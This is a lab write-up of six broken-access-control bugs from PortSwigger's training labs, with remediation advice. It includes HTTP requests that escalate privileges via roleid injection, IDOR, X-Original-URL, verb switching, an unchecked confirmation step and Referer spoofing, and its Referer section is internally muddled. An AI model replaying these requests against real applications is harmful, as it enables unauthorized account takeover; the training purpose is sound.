# Broken Access Control — PortSwigger Web Security Academy

**A practical write-up of six access control vulnerability classes, exploited and documented while working through PortSwigger's Web Security Academy labs.**

Broken access control consistently ranks as the #1 category in the [OWASP Top 10](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), and for good reason — it's a logic flaw rather than a syntax flaw, which means no scanner reliably finds it. Every case below was found by reading requests and responses carefully and asking one question repeatedly: *"what is actually stopping me from doing this as a different user?"*

## Table of contents

1. [General recon methodology](#general-recon-methodology)
2. [Unprotected functionality via response-based role disclosure](#1-unprotected-functionality-via-response-based-role-disclosure)
3. [Horizontal privilege escalation (IDOR)](#2-horizontal-privilege-escalation-idor)
4. [URL-based access control bypass (`X-Original-URL`)](#3-url-based-access-control-bypass)
5. [Method-based access control bypass](#4-method-based-access-control-bypass)
6. [Multi-step process with a missing check](#5-multi-step-process-with-a-missing-check)
7. [Referer-based access control bypass](#6-referer-based-access-control-bypass)
8. [Consolidated remediation guidance](#consolidated-remediation-guidance)
9. [Key takeaways](#key-takeaways)

---

## General recon methodology

Before touching any specific vulnerability class, every lab started with the same checklist:

- **Check `robots.txt`** and other discovery paths for endpoints that aren't linked from the UI (`/admin`, `/admin-panel`, `/config`, etc.).
- **Read the page source and JS bundles** for endpoints that aren't rendered but are still reachable — client-side hiding is not access control.
- **Inspect cookies for client-controlled trust decisions** — flags like `admin=false` that the client can simply flip to `true`.
- **Diff requests for logically-related actions** (e.g. "change email" vs "view profile") to spot fields the server echoes back that were never in the original request — these are often privilege fields like `roleid` that got leaked into a response.
- **Look for identifiers in URLs and bodies** (`id`, `userid`, `uid`, `account`) — anywhere a client supplies *which record* it wants, and test whether the server checks *who's asking* against *what they asked for*.
- **Look for links exposing other users' identifiers** — profile links, "view as" features, shared resources.
- **Test vertical escalation paths deliberately** — admin panels, hard-coded credentials in JS/comments, forgotten debug routes.
- **Check IDOR-style object references** for predictable, sequential IDs on things like downloadable files or invoices.

Everything documented below is a variation on that checklist finding a gap between *authentication* (proving who you are) and *authorization* (proving you're allowed to do the specific thing you're asking for).

---

## 1. Unprotected functionality via response-based role disclosure

**Vulnerability class:** Vertical privilege escalation via information disclosure in an unrelated response.

### The bug

The "change email" endpoint didn't just confirm the email change — it echoed the user's *entire account object* back in the response, including a `roleid` field that was never sent in the request:

```http
POST /my-account/change-email HTTP/2
Content-Type: text/plain;charset=UTF-8

{"email":"wiener@mail.net"}
```

```json
{
  "username": "wiener",
  "email": "wiener@mail.net",
  "apikey": "F87FgjMguGzMMiVkeD3Lv49kF9QPbbFI",
  "roleid": 1
}
```

The server was clearly reading `roleid` from the same JSON body it accepted for the email update — it just hadn't been asked to change it yet. That's the signal: if a field appears in a response but not in the corresponding request, try sending it.

### Exploitation

Adding the field to the request body and resending:

```http
POST /my-account/change-email HTTP/2
Content-Type: text/plain;charset=UTF-8

{"email":"wiener@mail.net","roleid":2}
```

```json
{
  "username": "wiener",
  "email": "wiener@mail.net",
  "apikey": "F87FgjMguGzMMiVkeD3Lv49kF9QPbbFI",
  "roleid": 2
}
```

The response confirms `roleid` changed from `1` to `2`. Navigating to `/admin` then grants access to administrative functionality (e.g. deleting the `carlos` user).

### Why it happened

The endpoint deserialized the incoming JSON directly into the same object used elsewhere for role logic, and trusted every field in it rather than only the one field ("email") the endpoint was designed to update. This is a textbook **mass assignment** issue layered on top of missing access control.

---

## 2. Horizontal privilege escalation (IDOR)

**Vulnerability class:** Insecure Direct Object Reference (IDOR).

### The bug

The account page took the target user's identifier straight from a query parameter, with no check that it matched the session's own user:

```http
GET /my-account?id=wiener HTTP/2
Cookie: session=<wiener_session>
```

### Exploitation

Simply swapping the `id` value for another known username, while keeping your own session cookie:

```http
GET /my-account?id=carlos HTTP/2
Cookie: session=<wiener_session>
```

If the server returns `carlos`'s account data to `wiener`'s session, authentication and authorization have been decoupled — the app confirmed *who you are* but never checked *whether you're allowed to see the record you asked for*.

### Why it happened

The application used a **user-supplied, predictable identifier** (a username, in this case — sequential numeric IDs are just as common) as the sole basis for deciding which record to return, instead of deriving the "current user" from the authenticated session server-side.

---

## 3. URL-based access control bypass

**Vulnerability class:** Access control enforced at the wrong layer (front-end/reverse proxy) instead of the application layer.

### The bug

Requesting `/admin` directly returned a bare, generic block — no branded error page, no application chrome. That's a strong signal the block is happening in a front-end component (load balancer, reverse proxy, WAF rule) rather than inside the actual application logic, and that the back-end may still process the *real* path from a different source.

### Exploitation

1. Confirm the front end is blocking based on the request line, not the app:

   ```http
   GET /admin HTTP/2
   ```
   → blocked with a generic response.

2. Test whether the back end trusts an `X-Original-URL` header (a pattern supported by some frameworks/reverse-proxy setups for internal routing):

   ```http
   GET / HTTP/2
   X-Original-URL: /invalid
   ```
   → the app returns a proper application-level "not found" page, proving the **back end is routing based on the header**, not the request line the front end inspected.

3. Supply the real target in the header instead of the request line, since the front end never inspects header values:

   ```http
   GET / HTTP/2
   X-Original-URL: /admin
   ```
   → full admin page access.

4. Combine it with a query string to perform an action, not just view a page:

   ```http
   GET /?username=carlos HTTP/2
   X-Original-URL: /admin/delete
   ```
   → deletes the `carlos` account.

### Why it happened

Two systems (an edge/front-end filter and the back-end application) disagreed about what "the URL" was. The front end filtered on the literal request-line path; the back end trusted a header that the front end never sanitized or stripped. Access control split across two components is only as strong as the weaker one.

---

## 4. Method-based access control bypass

**Vulnerability class:** Access control that checks the HTTP method rather than the operation.

### The bug

The admin-only "promote user" action was properly blocked for a low-privileged session **when sent as `POST`**:

```http
POST /admin-roles HTTP/2
Cookie: session=<low_priv_session>

username=carlos&action=upgrade
```

```http
HTTP/2 401 Unauthorized
"Unauthorized"
```

### Exploitation

The exact same operation, re-sent as `GET` with the parameters moved into the query string, was allowed:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=<low_priv_session>
```

```http
HTTP/2 302 Found
Location: /admin
```

The access control check existed — it was just written to fire only on `POST`, so switching verbs walked straight past it while hitting the identical application logic underneath.

### Why it happened

Method-specific route handling (a very common pattern in older or hand-rolled routers) let an authorization check live on only one code path instead of being enforced centrally for the *action*, regardless of which HTTP verb reached it.

---

## 5. Multi-step process with a missing check

**Vulnerability class:** Access control enforced on step 1 of a workflow but not on step 2.

### The bug

Promoting a user to admin was a two-step confirmation flow:

```http
POST /admin-roles HTTP/2
Cookie: session=<admin_session>

username=carlos&action=upgrade
```
followed by a confirmation step:
```http
POST /admin-roles HTTP/2
Cookie: session=<admin_session>

action=upgrade&confirmed=true&username=carlos
```

The access control check was implemented on the **first** request but never re-validated on the **second**, confirmation, request — a very common oversight, since developers naturally focus scrutiny on the "main" action and treat the confirmation as trivial plumbing.

### Exploitation

1. Grab a low-privileged session cookie.
2. Replay **only the confirmation step**, substituting the low-privileged session:

   ```http
   POST /admin-roles HTTP/2
   Cookie: session=<low_priv_session>

   action=upgrade&confirmed=true&username=wiener
   ```
3. `302 Found` — the low-privileged user has just self-promoted, having never touched the (correctly protected) first step at all.

### Why it happened

Access control was treated as a property of an *endpoint* rather than a property of an *action*. Any endpoint that mutates state needs authorization checked on every request that can reach it, not just the one the UI usually calls first.

---

## 6. Referer-based access control bypass

**Vulnerability class:** Access control based on a client-controlled, spoofable header.

### The bug

An admin-only action appeared to be gated on request origin — the app seemingly trusted that a request "came from" the admin panel:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Cookie: session=<low_priv_session>
Referer: https://target/admin
```

```http
HTTP/2 401 Unauthorized
```

Interesting: it *was* still blocked here, which shows the check partially worked — the app was actually looking at the `Referer` header value, not properly validating the session's role.

### Exploitation

Because `Referer` is fully attacker-controlled and merely needs to *contain* the expected path, spoofing it on the exact same request (with the exact same low-privileged session) was enough:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=<low_priv_session>
Referer: https://target/admin
```

```http
HTTP/2 302 Found
```

### Why it happened

`Referer` is sent by the browser and can be omitted, rewritten, or spoofed entirely by any HTTP client — it describes *where a request claims to have come from*, not *who is making it* or *what they're allowed to do*. Using it as an authorization signal conflates client-supplied metadata with server-verified identity.

---

## Consolidated remediation guidance

Every one of the six labs above traces back to the same handful of root causes, and the fixes are correspondingly consistent:

| Root cause | Fix |
|---|---|
| Trusting client-supplied fields for privileged state (`roleid`) | Never bind privileged fields from a generic request body; whitelist exactly the fields an endpoint is meant to update, and derive role/permission from server-side session state only. |
| Trusting client-supplied identifiers (`id=carlos`) | Always resolve "the current user" from the authenticated session, server-side — never from a request parameter — and enforce object-level ownership checks on every record access. |
| Access control split across layers (edge vs. app) | Enforce authorization once, in the application layer, and never trust internal-routing headers (`X-Original-URL`, `X-Rewrite-URL`) from untrusted clients; strip them at the edge if a component genuinely needs them internally. |
| Access control scoped to one HTTP method | Authorize the *action/route handler*, independent of verb; map both `GET` and `POST` (and any other accepted method) to the same authorization check. |
| Access control checked on step 1 of N, not every step | Treat every request in a multi-step flow as independently untrusted; re-validate authorization on each step, including "confirm" and "cancel" actions. |
| Authorization decided from spoofable headers (`Referer`, `X-Forwarded-For`, client cookies like `admin=true`) | Base every authorization decision on server-side session state that the client cannot directly set. |

General principle underlying all of it: **authorization must be enforced server-side, on every request, based on data the server itself controls (the session) — never on data the client supplies, echoes, or claims.**

---

## Key takeaways

- Broken access control is rarely a single "bug" — it's usually a **gap in coverage**: a check that exists for one method, one step, or one field, but not the equivalent path right next to it.
- **Diffing requests and responses** for unexplained fields (`roleid` appearing in a response body you never sent) is one of the highest-signal recon techniques for this vulnerability class.
- A **generic-looking error page** on a blocked endpoint is worth investigating — it can indicate the block is happening at an infrastructure layer that the application itself doesn't know about, which opens up header-based routing tricks like `X-Original-URL`.
- Any header or field the **client controls** (`Referer`, cookies, request method, body fields) is not a valid basis for an authorization decision, no matter how reasonable it looks in the code.
- Multi-step and confirmation flows deserve *extra* scrutiny, not less — they're a common place for developers to assume "the important check already happened."

---

*All vulnerabilities above were identified and exploited in isolated, intentionally vulnerable environments provided by [PortSwigger's Web Security Academy](https://portswigger.net/web-security) for educational purposes. Lab identifiers, session tokens, and API keys shown are single-use values tied to ephemeral, per-user lab instances and carry no ongoing validity.*
